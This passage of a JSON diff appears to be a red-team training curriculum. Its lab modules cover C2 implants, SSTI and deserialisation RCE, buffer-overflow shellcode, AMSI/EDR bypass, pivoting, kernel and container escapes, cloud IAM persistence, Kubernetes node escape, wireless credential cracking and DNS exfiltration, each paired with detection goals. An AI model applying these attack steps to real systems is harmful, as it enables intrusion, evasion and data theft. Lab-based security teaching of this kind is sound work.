+          "subtopics": ["C2 architecture: team server, listeners and redirectors", "Choosing an open-source C2 such as Sliver or Mythic", "Beacon call-back intervals, jitter and profiles", "HTTP, HTTPS and DNS communication channels", "Redirectors and domain fronting concepts in a lab", "Operating multiple sessions and tasking", "Infrastructure teardown and hygiene", "Detection angle: beacon traffic and JA3 fingerprinting"],
+          "tools": ["Sliver", "Mythic", "nginx"],
+          "lab_task": "Stand up a Sliver C2 in your lab. Generate an HTTPS implant, run it on a lab host, and confirm the session with jitter configured. Put an nginx redirector in front of the team server. Task the implant to run a command and download a file. Record the beacon profile and capture the traffic to note the JA3 and timing patterns a defender could detect.",
+          "deliverable": "C2 setup notes with implant session, redirector config and traffic analysis",
+          "checks": [["Run the implant and check the Sliver console", "An active C2 session is established through the redirector", "Sliver console"], ["Task the implant to execute a command", "The command output is returned to the team server", "Sliver output"], ["Capture and inspect the beacon traffic", "Regular call-back intervals or a JA3 fingerprint are identifiable", "Packet capture"]],
+          "objectives": ["Deploy a C2 with listeners and a redirector", "Operate implants with tuned beacon profiles", "Identify network detections for C2 traffic"]
+        },
+        {
+          "topic": "Advanced Web Exploitation: Deserialisation and Template Injection",
+          "subtopics": ["Insecure deserialisation in Java, PHP and .NET", "Building gadget chains with ysoserial", "Server-side template injection detection and escalation", "Sandbox escapes in template engines", "Prototype pollution leading to impact", "Chaining to remote code execution safely", "Source review to confirm the sink", "Detection angle: WAF rules and application exception logs"],
+          "tools": ["Burp Suite", "ysoserial", "Kali Linux"],
+          "lab_task": "On a lab app, detect SSTI by submitting `${7*7}` and polyglots, then identify the engine and escalate to command execution. On a separate endpoint accepting serialised objects, build a `ysoserial` gadget chain to achieve RCE and confirm with a controlled callback to your lab listener. Record the sink, the payload and the non-destructive proof of execution.",
+          "deliverable": "Advanced web exploitation report with SSTI and deserialisation RCE proof",
+          "checks": [["Submit the SSTI probe payload", "The response evaluates the expression (for example returns 49)", "HTTP response"], ["Deliver the ysoserial gadget chain", "A controlled callback confirms code execution on the target", "Listener output"], ["Review the application exception log", "The deserialisation or template error is recorded server-side", "Application log"]],
+          "objectives": ["Exploit insecure deserialisation for RCE", "Detect and escalate template injection", "Describe server-side evidence of these attacks"]
+        },
+        {
+          "topic": "Exploit Development and Buffer Overflow in a Lab VM",
+          "subtopics": ["x86 stack layout, registers and calling conventions", "Fuzzing a vulnerable service to find the crash", "Controlling EIP and finding the offset", "Locating bad characters and a JMP ESP gadget", "Generating shellcode with msfvenom and avoiding bad chars", "Modern mitigations: DEP, ASLR and stack canaries", "ROP as an awareness-level bypass concept", "Detection angle: crash telemetry and exploit-guard alerts"],
+          "tools": ["Immunity Debugger", "mona.py", "msfvenom"],
+          "lab_task": "Against a deliberately vulnerable lab service, fuzz with increasing buffers to crash it, use a cyclic pattern to find the EIP offset, identify bad characters and a JMP ESP with mona.py, then place msfvenom shellcode to get a shell. Confirm with a reverse connection. Record the offset, bad chars and the mitigations that would stop the exploit on a hardened build.",
+          "deliverable": "Exploit development write-up with offset, bad chars and working PoC",
+          "checks": [["Send the cyclic pattern and read EIP", "mona identifies the exact offset that overwrites EIP", "Debugger output"], ["Run the final exploit against the service", "A reverse shell connects back to the listener", "Listener output"], ["Enable DEP/ASLR on a hardened build and retry", "The basic exploit fails, confirming the mitigation", "Debugger output"]],
+          "objectives": ["Develop a stack buffer-overflow exploit", "Handle bad characters and shellcode placement", "Explain how modern mitigations break the exploit"]
+        },
+        {
+          "topic": "Bypassing Endpoint Detection in a Controlled Lab",
+          "subtopics": ["How EDR hooks user-mode APIs and collects telemetry", "AMSI and its role in script scanning", "ETW and the signals it provides to defenders", "In-memory execution versus writing to disk", "Unhooking and syscall techniques at a concept level", "Testing payloads against a lab EDR, never live tenants", "Balancing evasion against operational risk", "Detection angle: behavioural analytics that survive evasion"],
+          "tools": ["Sliver", "amsi.fail techniques", "Windows lab VM"],
+          "lab_task": "In a lab VM with a free EDR or Defender enabled, run a PowerShell payload and observe AMSI blocking it. Apply an AMSI bypass in memory and re-run to compare. Deliver an implant with an in-memory loader instead of dropping to disk. Record which techniques reduced detection and which behavioural alerts fired anyway. Keep all testing to the lab host only.",
+          "deliverable": "Evasion lab report comparing detection before and after each technique",
+          "checks": [["Run the script before applying any bypass", "AMSI blocks the script and logs a detection", "EDR log"], ["Apply the in-memory AMSI bypass and re-run", "The script executes without the AMSI block", "Execution output"], ["Review behavioural telemetry after evasion", "A behavioural alert still records the suspicious activity", "EDR telemetry"]],
+          "objectives": ["Explain EDR, AMSI and ETW telemetry", "Test in-memory and bypass techniques safely", "Show behavioural detections that survive evasion"]
+        },
+        {
+          "topic": "Pivoting Through Segmented Lab Networks at Depth",
+          "subtopics": ["Multi-hop pivoting across several segments", "SOCKS chains and nested proxies", "Port forwarding with ligolo-ng and chisel", "Routing C2 traffic through pivots", "Reaching air-gapped-style segments via dual-homed hosts", "Maintaining stable tunnels under load", "Avoiding loops and routing conflicts", "Detection angle: east-west traffic and segmentation alerts"],
+          "tools": ["ligolo-ng", "chisel", "proxychains"],
+          "lab_task": "Across a three-segment lab, build a multi-hop pivot with ligolo-ng: agent on the first host, add a route to the second segment, then chain a further hop to reach a host only visible from the third segment. Route a scan and a C2 beacon through the chain. Confirm access to the deepest host and record the east-west connections a segmented IDS would flag.",
+          "deliverable": "Multi-hop pivot diagram with routes, tunnels and deepest-host proof",
+          "checks": [["Build the ligolo-ng route to the deepest segment", "A scan reaches a host only visible from the third segment", "Scan output"], ["Route a C2 beacon through the pivot chain", "The beacon checks in through the tunnelled path", "C2 console"], ["Review segmentation monitoring", "Unusual east-west connections across segments are recorded", "IDS log"]],
+          "objectives": ["Build multi-hop pivots across segments", "Route scans and C2 through nested tunnels", "Describe east-west detection of pivoting"]
+        },
+        {
+          "topic": "Linux Kernel and Container Escape Testing in the Lab",
+          "subtopics": ["Kernel version triage and exploit suitability", "Compiling and running a kernel exploit in a lab VM", "Capability-based escapes and dangerous namespaces", "Escaping a container via kernel or misconfiguration", "cgroup and release_agent escape techniques", "Stabilising root after an escape", "Hardening: seccomp, AppArmor and patching", "Detection angle: auditd and runtime security monitoring"],
+          "tools": ["Kali Linux", "linux-exploit-suggester", "Docker"],
+          "lab_task": "On a lab host, enumerate the kernel with `uname -a` and linux-exploit-suggester, compile a suitable kernel exploit and gain root in an isolated VM. From a lab container with CAP_SYS_ADMIN, perform a release_agent cgroup escape to run a command on the host. Confirm each escape and record the hardening (seccomp, patching) and the auditd events that would detect it.",
+          "deliverable": "Kernel and container escape report with proof and hardening guidance",
+          "checks": [["Run the compiled kernel exploit in the lab VM", "A root shell is obtained on the target VM", "Shell output"], ["Perform the release_agent escape from the container", "A command executes on the host filesystem", "Command output"], ["Apply seccomp or drop the capability and retry", "The container escape fails, confirming the mitigation", "Test output"]],
+          "objectives": ["Triage and run Linux kernel exploits safely", "Escape a misconfigured container to the host", "Recommend hardening and detection for escapes"]
+        },
+        {
+          "topic": "Cloud Privilege Escalation and IAM Attack Paths",
+          "subtopics": ["Mapping IAM relationships into a graph", "PassRole, policy versioning and privilege-escalation primitives", "Assuming roles across accounts you own", "Abusing instance profiles and metadata credentials", "Lambda and automation as escalation vectors", "Persistence via access keys and trust policies", "Least-privilege remediation guidance", "Detection angle: CloudTrail anomalies and GuardDuty"],
+          "tools": ["Pacu", "AWS CLI", "cloudfox"],
+          "lab_task": "In an AWS account you own, map escalation paths with Pacu's iam__privesc_scan and cloudfox. Chain a PassRole or policy-version primitive to assume a higher-privileged role with `aws sts assume-role`. Establish persistence by adding an access key to a role you now control. Record the escalation chain, the persistence created and the CloudTrail and GuardDuty findings produced.",
+          "deliverable": "Cloud escalation report with the IAM chain, persistence and detection evidence",
+          "checks": [["Run the Pacu privilege-escalation scan", "At least one viable escalation path is reported", "Pacu output"], ["Assume the higher-privileged role", "sts assume-role returns credentials for the elevated role", "AWS CLI output"], ["Review GuardDuty after the activity", "A finding is raised for the anomalous IAM behaviour", "GuardDuty console"]],
+          "objectives": ["Map and exploit IAM escalation paths", "Chain cloud primitives to higher privilege", "Verify cloud detection of escalation"]
+        },
+        {
+          "topic": "Kubernetes Cluster Attack and Hardening in the Lab",
+          "subtopics": ["Cluster recon: API server, kubelet and etcd exposure", "Service-account token abuse from a pod", "RBAC misconfigurations and privilege escalation", "Escaping a privileged pod to the node", "Secrets extraction and lateral movement in-cluster", "Attacking exposed dashboards and the kubelet API", "Hardening: RBAC, PSA, network policy and admission control", "Detection angle: Kubernetes audit logs and Falco"],
+          "tools": ["kubectl", "kube-hunter", "Peirates"],
+          "lab_task": "In a lab Kubernetes cluster, scan with `kube-hunter`, then from a compromised pod use the mounted service-account token to query the API with kubectl. Exploit an over-permissive RBAC role to create a privileged pod and escape to the node. Extract a secret. Record the RBAC flaw, the node access gained, the hardening that fixes it and the audit/Falco events produced.",
+          "deliverable": "Kubernetes attack report with node compromise and hardening recommendations",
+          "checks": [["Query the API with the pod service-account token", "The API returns resources the token is authorised to read", "kubectl output"], ["Create a privileged pod and escape to the node", "A shell on the underlying node is obtained", "Shell output"], ["Review the Kubernetes audit log or Falco", "The privileged-pod creation is recorded as an alert", "Audit log"]],
+          "objectives": ["Attack a Kubernetes cluster from a pod", "Escalate via RBAC and escape to the node", "Recommend cluster hardening and detection"]
+        },
+        {
+          "topic": "Wireless Enterprise Attacks and Defence Awareness",
+          "subtopics": ["WPA2-Enterprise and 802.1X EAP methods", "Evil-twin and rogue RADIUS against a lab network you own", "Capturing and cracking MSCHAPv2 challenge-responses", "PEAP and EAP-TLS certificate validation weaknesses", "Client misconfiguration and credential theft theory", "Segmentation of wireless from core networks", "Keeping all testing on learner-owned wireless", "Detection angle: wireless IDS and RADIUS anomaly alerts"],
+          "tools": ["hostapd-wpe", "Hashcat", "aircrack-ng"],
+          "lab_task": "Against a WPA2-Enterprise network you own, stand up a rogue RADIUS with hostapd-wpe, capture an MSCHAPv2 challenge-response from a test client, and crack it with `hashcat -m 5500`. Document how EAP-TLS or correct certificate validation would prevent the capture. Record the credentials recovered and the wireless-IDS and RADIUS log events a defender would see.",
+          "deliverable": "WPA2-Enterprise test report with captured credentials and defence analysis",
+          "checks": [["Capture an MSCHAPv2 exchange with hostapd-wpe", "A challenge-response pair is captured from the test client", "hostapd-wpe log"], ["Crack the response with Hashcat mode 5500", "The test account password is recovered", "hashcat output"], ["Document the EAP-TLS defence", "The report explains why certificate validation blocks the attack", "Report section"]],
+          "objectives": ["Attack WPA2-Enterprise on an owned network", "Capture and crack MSCHAPv2 responses", "Explain certificate-based defences and detection"]
+        },
+        {
+          "topic": "Purple Teaming: Attack and Detection Validation",
+          "subtopics": ["Collaborative attack-and-detect cycles", "Selecting techniques from an ATT&CK plan", "Executing an atomic test and watching telemetry", "Tuning detections until they fire reliably", "Measuring detection and prevention per technique", "Documenting coverage improvements", "Feeding results back to engineering", "Detection angle: converting each attack into a durable rule"],
+          "tools": ["Atomic Red Team", "Wazuh", "MITRE ATT&CK Navigator"],
+          "lab_task": "Run a purple-team session: pick five ATT&CK techniques, execute each with Atomic Red Team on a lab host, and check whether your Wazuh detections fire. For any miss, write or tune a rule and re-run until it alerts. Record prevented, detected and missed per technique and update an ATT&CK coverage layer. Produce a before-and-after coverage summary.",
+          "deliverable": "Purple-team report with per-technique outcomes and improved detections",
+          "checks": [["Execute an atomic test for a chosen technique", "The technique runs and generates telemetry on the host", "Atomic output"], ["Tune a rule for a missed detection and re-run", "The detection now fires for that technique", "SIEM alert"], ["Compare the before-and-after coverage layer", "Detection coverage increases for the tested techniques", "Navigator layer"]],
+          "objectives": ["Run collaborative attack-and-detect cycles", "Tune detections until they reliably fire", "Measure and report coverage improvements"]
+        },
+        {
+          "topic": "Data Exfiltration Simulation and Detection in the Lab",
+          "subtopics": ["Staging and compressing data before exfiltration", "Exfiltration over HTTPS, DNS and alternate channels", "Throttling and chunking to evade volume alerts", "Cloud-storage and legitimate-service abuse concepts", "Simulating sensitive data with synthetic lab files", "Measuring what DLP and egress monitoring catch", "Balancing realism against safety in the lab", "Detection angle: egress volume, DNS entropy and DLP rules"],
+          "tools": ["dnscat2", "Sliver", "Wireshark"],
+          "lab_task": "Using synthetic data in your lab, simulate exfiltration over a DNS channel with dnscat2 and over HTTPS via your C2, chunking and throttling the transfer. Capture the traffic in Wireshark. Measure what a lab DLP or egress monitor detects for each channel. Record the throughput, the detections triggered and which channel was quietest, using only lab-generated data.",
+          "deliverable": "Exfiltration simulation report comparing channels and their detections",
+          "checks": [["Exfiltrate the synthetic file over the DNS channel", "The file is reconstructed intact at the receiving end", "dnscat2 output"], ["Inspect the DNS traffic in Wireshark", "High query volume or elevated name entropy is observable", "Packet capture"], ["Review egress or DLP monitoring", "At least one channel triggers an exfiltration alert", "Monitoring log"]],
+          "objectives": ["Simulate exfiltration over multiple channels safely", "Measure detection per channel", "Explain egress and DNS-based detection"]
+        },
+        {
+          "topic": "Breach and Attack Simulation Automation",
+          "subtopics": ["BAS concepts and continuous validation", "Building an automated attack chain with Caldera", "Adversary profiles and ability chaining", "Scheduling repeatable simulations in the lab", "Collecting results and detection outcomes automatically", "Integrating BAS output with the SIEM", "Trending coverage over time", "Detection angle: automated validation of detections"],
+          "tools": ["MITRE Caldera", "Wazuh", "Python"],
+          "lab_task": "Deploy MITRE Caldera in the lab with an agent on a target host. Build an adversary profile chaining discovery, credential-access and lateral-movement abilities. Run the operation and export the results. Correlate each ability with whether your SIEM detected it, and script a summary of detected-versus-missed. Record the chain executed and the coverage percentage achieved.",
+          "deliverable": "BAS report with the adversary profile, results and detection coverage",
+          "checks": [["Run the Caldera operation against the agent", "The chained abilities execute and results are recorded", "Caldera output"], ["Correlate abilities with SIEM alerts", "Each ability is marked detected or missed", "Correlation report"], ["Review the coverage summary", "A detection coverage percentage is produced for the run", "Summary output"]],
+          "objectives": ["Automate an attack chain with a BAS tool", "Correlate simulation results with detections", "Trend detection coverage over time"]
+        },
+        {
+          "topic": "Threat-Informed Remediation and Risk Reporting",
+          "subtopics": ["Prioritising remediation by attack path, not finding count", "Linking findings to ATT&CK and real threat behaviour", "Root-cause grouping of related findings", "Risk acceptance, transfer and compensating controls", "CVSS 4.0 plus business context for priorities", "Executive narrative tied to crown-jewel objectives", "Remediation roadmap with owners and timelines", "Detection angle: recommending durable detections per path"],
+          "tools": ["CVSS 4.0 calculator", "MITRE ATT&CK Navigator", "Markdown editor"],
+          "lab_task": "From a full lab engagement, group findings by root cause and the attack paths they enable. Prioritise remediation by path impact to the crown-jewel objective, not by raw count. Score with CVSS 4.0 plus environmental context, and recommend a durable detection for each path. Write an executive narrative and a remediation roadmap with owners and timelines. Produce the report.",
+          "deliverable": "Threat-informed report with prioritised roadmap and per-path detections",
+          "checks": [["Review the remediation prioritisation", "Fixes are ordered by attack-path impact, not finding count", "Report section"], ["Check each attack path in the report", "Every path has a recommended durable detection", "Report section"], ["Read the remediation roadmap", "Each item has an owner and a target timeline", "Roadmap table"]],
+          "objectives": ["Prioritise remediation by attack-path impact", "Combine CVSS 4.0 with business context", "Recommend durable detections per path"]
+        },
+        {
+          "topic": "Operational Security and Engagement Deconfliction",
+          "subtopics": ["Operator OPSEC and artefact minimisation", "Logging operator actions for an audit trail", "Deconfliction between red and blue during live tests", "Handling discovery of real incidents during a test", "Secure handling of captured credentials and data", "Infrastructure hygiene and teardown", "Legal and ethical boundaries under pressure", "Detection angle: distinguishing test activity from real threats"],
+          "tools": ["Markdown editor", "GPG", "Kali Linux"],
+          "lab_task": "Produce an OPSEC and deconfliction playbook for a lab red-team engagement: operator logging format, a deconfliction procedure with the blue team, a process for handling a real incident discovered mid-test, and secure storage of captured data with GPG encryption. Run a tabletop where the blue team must tell test activity from a real alert. Record the decisions and evidence handling.",
+          "deliverable": "OPSEC and deconfliction playbook with a tabletop exercise record",
+          "checks": [["Review the deconfliction procedure", "A clear process exists for confirming whether activity is the test", "Playbook"], ["Encrypt a captured-data sample with GPG", "The file is encrypted and only decryptable with the intended key", "GPG output"], ["Run the tabletop discovery scenario", "The team correctly distinguishes test activity from a real alert", "Exercise record"]],
+          "objectives": ["Apply operator OPSEC and artefact control", "Run deconfliction with the blue team", "Handle data and real incidents responsibly"]
+        },
+        {
+          "topic": "Advanced Capstone: Full-Scope Authorised Lab Red Team Engagement",
+          "subtopics": ["Objective-based planning against the lab estate", "Initial access through AD, cloud and container paths", "Chained escalation to the crown-jewel objective", "Evasion, C2 and OPSEC throughout the operation", "Purple-team debrief and detection validation", "Executive and technical reporting with a retest plan"],
+          "tools": ["Sliver", "BloodHound", "Certipy", "Impacket"],
+          "lab_task": "Run a full-scope red-team-style engagement against your authorised lab estate toward a defined crown-jewel objective: gain initial access, chain AD, certificate or cloud attacks to escalate, operate via C2 with OPSEC, and capture the objective proof. Hold a purple-team debrief validating detections, then deliver executive and technical reports with a retest plan. Confirm only the authorised lab estate was touched.",
+          "deliverable": "Complete red-team package: operation log, objective proof, reports and debrief",
+          "checks": [["Execute the operation to the crown-jewel objective", "The objective proof is captured via a chained attack path", "Objective evidence"], ["Hold the purple-team debrief", "Each major step is marked detected or missed with evidence", "Debrief notes"], ["Review scope and reports", "Activity stayed in the authorised estate and reports include a retest plan", "Reports and scope log"]],
+          "objectives": ["Run a full-scope objective-based engagement", "Chain advanced attacks with OPSEC and C2", "Deliver reports, a debrief and a retest plan"]
+        }
+      ]
+    }
+  }
+}
